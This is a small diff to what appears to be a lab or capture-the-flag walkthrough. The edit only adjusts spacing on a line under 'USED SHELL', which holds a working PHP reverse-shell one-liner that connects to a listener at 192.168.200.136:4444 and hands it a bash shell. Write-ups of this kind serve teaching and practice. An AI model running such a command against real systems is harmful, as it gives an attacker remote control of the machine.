@@ -142,7 +142,7 @@ With the RCE from the exploit, we can get a [reverse shell](../../REVERSE%20SHEL
 
 # USED SHELL
 
-php:  `php -r '$sock=fsockopen("192.168.200.136",4444);shell_exec("bash <&3 >&3 2>&3");'`
+php: `php -r '$sock=fsockopen("192.168.200.136",4444);shell_exec("bash <&3 >&3 2>&3");'`
 
 # CONNECTION RECEIVED
 
